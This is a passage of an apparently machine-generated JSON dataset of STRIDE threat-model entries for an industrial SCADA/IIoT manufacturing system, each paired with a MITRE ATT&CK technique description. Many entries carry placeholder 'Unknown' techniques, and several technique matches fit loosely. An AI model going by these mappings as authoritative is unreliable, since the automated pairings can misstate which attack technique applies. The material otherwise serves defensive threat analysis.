[
{
    "case_number": "4",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate field device to the gateway, injecting malicious data that the control center processes and acts upon.",
            "Assumptions": [
                {
                    "Assumption": "Field devices and gateways communicate using identifiable credentials or network signatures.",
                    "Role": "Device",
                    "Condition": "Weak or absent mutual authentication."
                },
                {
                    "Assumption": "The attacker can gain access to the network near the field devices.",
                    "Role": "Attacker",
                    "Condition": "Physical or network proximity is possible."
                },
                {
                    "Assumption": "Gateway does not have sufficient mechanisms to detect device impersonation.",
                    "Role": "Gateway",
                    "Condition": "No robust anti-impersonation mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized disclosure, data corruption, operational disturbance.",
            "MITRE ATT&CK Keywords": [
                "device-defense-evasion",
                "network-intrusion",
                "identity-spoofing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor poses as a legitimate user accessing the Control Center HMI, issuing unauthorized control commands to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "User credentials can be stolen or guessed.",
                    "Role": "Attacker",
                    "Condition": "Weak password policies or phishing vulnerability."
                },
                {
                    "Assumption": "The HMI does not require multifactor authentication.",
                    "Role": "System",
                    "Condition": "Single-factor authentication only."
                },
                {
                    "Assumption": "The attacker can interact with the HMI interface.",
                    "Role": "Attacker",
                    "Condition": "Compromised or unsecured workstation."
                }
            ],
            "Potential Impact": "Unauthorized system control, potential sabotage.",
            "MITRE ATT&CK Keywords": [
                "credential-theft",
                "user-impersonation",
                "unauthorized-access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and alters data transmissions between the RTU and the gateway, posing as either endpoint to the other.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic between RTU and gateway is not fully encrypted.",
                    "Role": "System",
                    "Condition": "Lack of end-to-end encryption."
                },
                {
                    "Assumption": "Attacker has access to communication channels.",
                    "Role": "Attacker",
                    "Condition": "Network breach or physical access."
                },
                {
                    "Assumption": "Endpoints do not verify the integrity of received messages.",
                    "Role": "Device",
                    "Condition": "No cryptographic message verification."
                }
            ],
            "Potential Impact": "Data integrity compromise, control failure.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "network-eavesdropping",
                "communication-tampering"
            ],
            "mitre_technique": {
                "name": "Manipulation of Control",
                "description": "Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.   \n\nMethods of Manipulation of Control include: \n\n* Man-in-the-middle  \n* Spoof command message \n* Changing setpoints  \n\nA Polish student used a remote controller device to interface with the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. (Citation: Shelley Smith February 2008) The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. (Citation: Bruce Schneier January 2008)",
                "id": "attack-pattern--1af9e3fd-2bcc-414d-adbd-fe3b95c02ca1",
                "technique_id": "T0831"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a PLC, altering its configuration to cause undesirable behavior.",
            "Assumptions": [
                {
                    "Assumption": "PLCs are not physically secured.",
                    "Role": "Device",
                    "Condition": "Accessible to unauthorized personnel."
                },
                {
                    "Assumption": "Configuration changes on PLCs are not logged or monitored.",
                    "Role": "System",
                    "Condition": "Lack of auditing."
                },
                {
                    "Assumption": "PLCs do not require authentication for reconfiguration.",
                    "Role": "Device",
                    "Condition": "Weak or no access controls."
                }
            ],
            "Potential Impact": "Operational disruption, potential damage to equipment.",
            "MITRE ATT&CK Keywords": [
                "hardware-tampering",
                "configuration-manipulation",
                "physical-access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware is introduced into the MES database through an exploited vulnerability, altering production workflow data.",
            "Assumptions": [
                {
                    "Assumption": "MES database has known vulnerabilities.",
                    "Role": "System",
                    "Condition": "Unpatched software or misconfigured settings."
                },
                {
                    "Assumption": "Attack vectors like spear phishing or untrusted inputs are viable.",
                    "Role": "Attacker",
                    "Condition": "System exposed to network vectors."
                },
                {
                    "Assumption": "There are insufficient database integrity checks.",
                    "Role": "System",
                    "Condition": "Weak data validation mechanisms."
                }
            ],
            "Potential Impact": "Corruption of critical operational data, workflow interruptions.",
            "MITRE ATT&CK Keywords": [
                "database-exploitation",
                "malware-injection",
                "workflow-disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts WAN communications to inject false control commands into the SCADA system.",
            "Assumptions": [
                {
                    "Assumption": "WAN communications are not encrypted.",
                    "Role": "System",
                    "Condition": "Plain text or weak encryption methods."
                },
                {
                    "Assumption": "Attackers have access to critical network paths.",
                    "Role": "Attacker",
                    "Condition": "Network penetration possible."
                },
                {
                    "Assumption": "Command authenticity is not verified.",
                    "Role": "System",
                    "Condition": "No integrity checks on command messages."
                }
            ],
            "Potential Impact": "Unauthenticated control commands executed, potential process failures.",
            "MITRE ATT&CK Keywords": [
                "command-injection",
                "data-tampering",
                "unauthorized-commands"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider alters production workflow settings without leaving traceable evidence in the MES logs.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have permissions to modify workflows.",
                    "Role": "System",
                    "Condition": "Privileged access rights."
                },
                {
                    "Assumption": "Audit logs are poorly maintained or easily alterable.",
                    "Role": "System",
                    "Condition": "Weak logging practices."
                },
                {
                    "Assumption": "Insufficient monitoring of user activities.",
                    "Role": "System",
                    "Condition": "Lack of active surveillance."
                }
            ],
            "Potential Impact": "Operational disruptions without accountability.",
            "MITRE ATT&CK Keywords": [
                "insider-threat",
                "log-tampering",
                "access-abuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An unauthorized party accesses the HMI to issue detrimental commands and then removes traces from logs.",
            "Assumptions": [
                {
                    "Assumption": "HMI access logs can be edited.",
                    "Role": "System",
                    "Condition": "Logs not tamper-proof."
                },
                {
                    "Assumption": "Access to HMI is not strictly controlled.",
                    "Role": "System",
                    "Condition": "Weak authentication or physical security."
                },
                {
                    "Assumption": "Limited forensic capabilities for tracking changes.",
                    "Role": "System",
                    "Condition": "No real-time monitoring."
                }
            ],
            "Potential Impact": "Malicious commands executed without attribution.",
            "MITRE ATT&CK Keywords": [
                "user-forgery",
                "command-abuse",
                "forensic-evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates command logs on the gateway to cover up an intrusion.",
            "Assumptions": [
                {
                    "Assumption": "Gateway command logs are stored locally and not on a remote server.",
                    "Role": "System",
                    "Condition": "Logs not duplicated or backed up remotely."
                },
                {
                    "Assumption": "Logs can be accessed and altered by individuals with sufficient network access.",
                    "Role": "System",
                    "Condition": "No log integrity checks."
                },
                {
                    "Assumption": "Insufficient intrusion detection systems monitoring gateway activities.",
                    "Role": "System",
                    "Condition": "Weak or missing IDS."
                }
            ],
            "Potential Impact": "Obfuscates attack trail, making incident response difficult.",
            "MITRE ATT&CK Keywords": [
                "log-forgery",
                "trail-coverup",
                "gateway-manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data from the MES database is exfiltrated by malware introduced through a phishing attack.",
            "Assumptions": [
                {
                    "Assumption": "Phishing vectors are effective against employees.",
                    "Role": "Attacker",
                    "Condition": "Employees susceptible to phishing."
                },
                {
                    "Assumption": "MES database stores sensitive and unencrypted information.",
                    "Role": "System",
                    "Condition": "Unencrypted sensitive information."
                },
                {
                    "Assumption": "Malware can access and export data without detection.",
                    "Role": "System",
                    "Condition": "No robust anti-malware measures."
                }
            ],
            "Potential Impact": "Exposure of proprietary and sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "sensitive-data-exfiltration",
                "phishing-vector",
                "malware-persistence"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to cloud-stored data through compromised cloud service credentials.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service credentials are accessible through phishing or brute force.",
                    "Role": "Attacker",
                    "Condition": "Weak credential management."
                },
                {
                    "Assumption": "Cloud service lacks robust access controls.",
                    "Role": "System",
                    "Condition": "Insufficient authorization mechanisms."
                },
                {
                    "Assumption": "Exposed API endpoints enable unauthorized data access.",
                    "Role": "System",
                    "Condition": "Publicly accessible APIs."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive cloud-stored data.",
            "MITRE ATT&CK Keywords": [
                "cloud-compromise",
                "credential-theft",
                "unauthorized-access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leakage through unsecured MQTT protocol used in the IIoT communication to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "MQTT communications are not encrypted.",
                    "Role": "System",
                    "Condition": "Use of plaintext protocol for MQTT."
                },
                {
                    "Assumption": "Sensitive data not adequately protected during transmission.",
                    "Role": "System",
                    "Condition": "No encryption or masking of data."
                },
                {
                    "Assumption": "Attacker can intercept IIoT communication channels.",
                    "Role": "Attacker",
                    "Condition": "Access to network."
                }
            ],
            "Potential Impact": "Sensitive data intercepted during transmission.",
            "MITRE ATT&CK Keywords": [
                "data-leakage",
                "mqtt-protocol",
                "network-eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A volumetric DDoS attack targets the control center, overwhelming network traffic and disrupting operations.",
            "Assumptions": [
                {
                    "Assumption": "Control center is accessible over the internet.",
                    "Role": "System",
                    "Condition": "Internet-facing network."
                },
                {
                    "Assumption": "No DDoS mitigation in place.",
                    "Role": "System",
                    "Condition": "Lack of DDoS protection services."
                },
                {
                    "Assumption": "Attacker has control over a large botnet.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet for volumetric attacks."
                }
            ],
            "Potential Impact": "Operational disruption due to network unavailability.",
            "MITRE ATT&CK Keywords": [
                "ddos-attack",
                "network-flooding",
                "control-center-disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Logic bombs implanted in field devices are triggered to disrupt communication with the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are reconfigurable remotely without strict controls.",
                    "Role": "System",
                    "Condition": "Reconfiguration capabilities active."
                },
                {
                    "Assumption": "No comprehensive integrity checks of device firmware.",
                    "Role": "System",
                    "Condition": "Weak firmware integrity validation."
                },
                {
                    "Assumption": "Devices are not monitored for unusual activity patterns.",
                    "Role": "System",
                    "Condition": "Lack of anomaly detection on devices."
                }
            ],
            "Potential Impact": "Disruption to RTU communications and physical processes.",
            "MITRE ATT&CK Keywords": [
                "logic-bomb",
                "device-sabotage",
                "communication-disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious firmware updates disrupt cloud connectivity, leading to a breakdown in cloud service-dependent functionalities.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update process is inadequately secured.",
                    "Role": "System",
                    "Condition": "Lack of update source verification."
                },
                {
                    "Assumption": "Cloud services heavily relied upon for core operations.",
                    "Role": "System",
                    "Condition": "Operational dependency on cloud services."
                },
                {
                    "Assumption": "No fallback or redundancy mechanisms in place.",
                    "Role": "System",
                    "Condition": "Single point of failure in cloud dependency."
                }
            ],
            "Potential Impact": "Breakdown in cloud-dependent functionalities, service unavailability.",
            "MITRE ATT&CK Keywords": [
                "firmware-exploitation",
                "update-sabotage",
                "cloud-service-disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromise of an RTU device allows an attacker to gain higher privileges within the SCADA system and issue unauthorized commands.",
            "Assumptions": [
                {
                    "Assumption": "RTU devices have exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Unpatched or unsecure devices."
                },
                {
                    "Assumption": "RTUs communicate with higher privilege components without strict boundary controls.",
                    "Role": "System",
                    "Condition": "Weak privilege separation."
                },
                {
                    "Assumption": "The attacker can escalate privileges within the network.",
                    "Role": "Attacker",
                    "Condition": "Lack of robust privilege management."
                }
            ],
            "Potential Impact": "Unauthorized SCADA control, potential system sabotage.",
            "MITRE ATT&CK Keywords": [
                "privilege-escalation",
                "unpatched-vulnerabilities",
                "command-injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with legitimate access exploits vulnerabilities to gain unauthorized control over the cloud services managing IIoT data.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have some level of cloud access.",
                    "Role": "System",
                    "Condition": "Credentialed access to cloud services."
                },
                {
                    "Assumption": "Cloud services have unsecured vulnerabilities.",
                    "Role": "System",
                    "Condition": "Known exploitable weaknesses."
                },
                {
                    "Assumption": "Insufficient monitoring of privileged user activities.",
                    "Role": "System",
                    "Condition": "Lack of user activity logging."
                }
            ],
            "Potential Impact": "Unauthorized access and control over cloud services.",
            "MITRE ATT&CK Keywords": [
                "insider-threat",
                "cloud-compromise",
                "service-manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a weakly configured gateway to gain administrative access and intercept or alter all data passing to and from the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Gateway configurations are weak or improperly managed.",
                    "Role": "System",
                    "Condition": "Misconfigured gateway settings."
                },
                {
                    "Assumption": "Gateway lacks sufficient security hardening.",
                    "Role": "System",
                    "Condition": "No robust security posturing."
                },
                {
                    "Assumption": "Attackers have access to exploit these misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and opportunity for exploit."
                }
            ],
            "Potential Impact": "Administrative control over data flow, risk of widespread data tampering.",
            "MITRE ATT&CK Keywords": [
                "credential-theft",
                "administrative-access",
                "data-interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises their identity to gain unauthorized access to the Control Center HMI.",
            "Assumptions": [
                {
                    "Assumption": "HMI authentication process is weak or absent.",
                    "Role": "Control Center Operator",
                    "Condition": "HMI lacks strong authentication mechanisms."
                },
                {
                    "Assumption": "Attacker can access the WAN used by the Control Center.",
                    "Role": "Network Administrator",
                    "Condition": "WAN is not fully secured."
                },
                {
                    "Assumption": "HMI sessions can be easily hijacked.",
                    "Role": "Security Officer",
                    "Condition": "HMI does not enforce session timeouts or reconfirmation."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive manufacturing data and potential manipulation of production processes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "HMI",
                "control center",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers gain access to field devices by mimicking trusted RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Field devices trust commands from RTUs without stringent validation.",
                    "Role": "SCADA System Engineer",
                    "Condition": "RTUs are not authenticated securely by field devices."
                },
                {
                    "Assumption": "Network traffic between RTUs and field devices can be intercepted.",
                    "Role": "Network Security Analyst",
                    "Condition": "Lack of encrypted communication channels."
                },
                {
                    "Assumption": "Field devices do not log all command origins.",
                    "Role": "System Auditor",
                    "Condition": "Insufficient logging mechanisms in place."
                }
            ],
            "Potential Impact": "Tampering with operational data and unauthorized control of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "RTU",
                "spoofing",
                "field devices",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary spoofs the identity of a cloud service broker to intercept data streams.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services authentication is weak or compromised.",
                    "Role": "Cloud Security Administrator",
                    "Condition": "Ineffective authentication procedures for cloud services."
                },
                {
                    "Assumption": "Data streams are not adequately encrypted.",
                    "Role": "Data Security Officer",
                    "Condition": "Insufficient encryption standards in place for data streams."
                },
                {
                    "Assumption": "System does not validate the broker's identity rigorously.",
                    "Role": "IT Administrator",
                    "Condition": "Lack of robust identity validation mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "data interception",
                "broker",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies control commands sent from the Control Center to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Lack of integrity checks on control commands.",
                    "Role": "Control System Engineer",
                    "Condition": "Control commands do not have embedded integrity verification."
                },
                {
                    "Assumption": "Communication channels between Control Center and RTUs are vulnerable.",
                    "Role": "Network Administrator",
                    "Condition": "Weak or no encryption on communication links."
                },
                {
                    "Assumption": "RTUs do not verify the source of control commands.",
                    "Role": "SCADA Engineer",
                    "Condition": "RTUs accept commands without source verification."
                }
            ],
            "Potential Impact": "Manipulation of control commands could lead to operational disruptions and safety hazards.",
            "MITRE ATT&CK Keywords": [
                "control commands",
                "tampering",
                "RTU",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actors alter firmware settings on field devices such as PLCs.",
            "Assumptions": [
                {
                    "Assumption": "Field devices allow remote firmware updates without strong authentication.",
                    "Role": "Field Device Manager",
                    "Condition": "Insecure firmware update mechanism."
                },
                {
                    "Assumption": "Inadequate access controls for field devices.",
                    "Role": "Security Administrator",
                    "Condition": "Weak access control policies for field devices."
                },
                {
                    "Assumption": "Network is susceptible to unauthorized access.",
                    "Role": "Network Security Officer",
                    "Condition": "Network lacks robust intrusion prevention techniques."
                }
            ],
            "Potential Impact": "Compromised field devices could report incorrect data or malfunction, affecting overall manufacturing process integrity.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "PLCs",
                "remote update",
                "field devices"
            ],
            "mitre_technique": {
                "name": "Module Firmware",
                "description": "Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.   \n\nThis technique is similar to [System Firmware](https://attack.mitre.org/techniques/T0857), but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\nAn easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\n* Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.  \n* Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.  \n* Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.   \n* A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.  \n* Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",
                "id": "attack-pattern--efbf7888-f61b-4572-9c80-7e2965c60707",
                "technique_id": "T0839"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversaries manipulate databases within the MES to alter production workflows.",
            "Assumptions": [
                {
                    "Assumption": "Database is not properly secured or encrypted.",
                    "Role": "Database Administrator",
                    "Condition": "Weak security configurations on database."
                },
                {
                    "Assumption": "Internal network is vulnerable to attacks.",
                    "Role": "Network Security Engineer",
                    "Condition": "Unprotected internal network."
                },
                {
                    "Assumption": "Insufficient monitoring for anomalous database activities.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of real-time database activity monitoring."
                }
            ],
            "Potential Impact": "Corrupt production data could halt manufacturing operations and result in financial losses.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "MES",
                "production workflows",
                "internal network"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
